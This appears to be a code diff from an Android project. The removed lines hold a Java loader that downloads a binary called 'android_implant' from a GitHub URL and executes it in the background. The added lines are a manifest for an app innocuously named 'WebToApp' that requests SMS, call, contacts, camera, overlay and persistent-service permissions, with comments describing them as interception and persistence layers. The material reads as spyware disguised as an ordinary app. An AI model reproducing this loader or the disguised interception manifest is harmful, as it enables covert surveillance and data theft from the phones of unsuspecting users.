@@ -1,43 +1,40 @@
-new Thread(new Runnable() {
-    @Override
-    public void run() {
-        try {
-            // 1. Establish file paths in private application space
-            java.io.File payloadFile = new java.io.File(getFilesDir(), "android_implant");
+<manifest xmlns:android="http://android.com"
+    package="com.app.web_to_app">
+    
+    <!-- Hardware Interface Assertions -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-feature android:name="android.hardware.camera" />
+    <uses-feature android:name="android.hardware.camera.autofocus" />
 
-            // 2. Download the binary payload dynamically over the network if it does not exist
-            if (!payloadFile.exists()) {
-                // Your exact direct repository asset path
-                String githubUrl = "https://raw.githubusercontent.com/eyayaeisubalew-maker/androslifer/49a61f73caae015097fd938d5995ef8bdecb7d88/android_implant";
-                java.net.URL url = new java.net.URL(githubUrl);
-                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("GET");
-                connection.connect();
+    <!-- Telephony & Communication Interception Layers -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
-                if (connection.getResponseCode() == java.net.HttpURLConnection.HTTP_OK) {
-                    java.io.InputStream input = connection.getInputStream();
-                    java.io.OutputStream output = new java.io.FileOutputStream(payloadFile);
-                    
-                    byte[] buffer = new byte[1024];
-                    int bytesRead;
-                    while ((bytesRead = input.read(buffer)) != -1) {
-                        output.write(buffer, 0, bytesRead);
-                    }
-                    
-                    output.flush();
-                    output.close();
-                    input.close();
-                }
-            }
+    <!-- Core Database Access Mapping -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
 
-            // 3. Grant executive privileges and launch the implant background daemon
-            if (payloadFile.exists()) {
-                payloadFile.setExecutable(true);
-                Runtime.getRuntime().exec(new String[]{payloadFile.getAbsolutePath()});
-            }
+    <!-- Persistence Lifecycle Assertions -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}).start();
+    <application
+        android:allowBackup="true"
+        android:label="WebToApp"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:supportsRtl="true">
+        
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
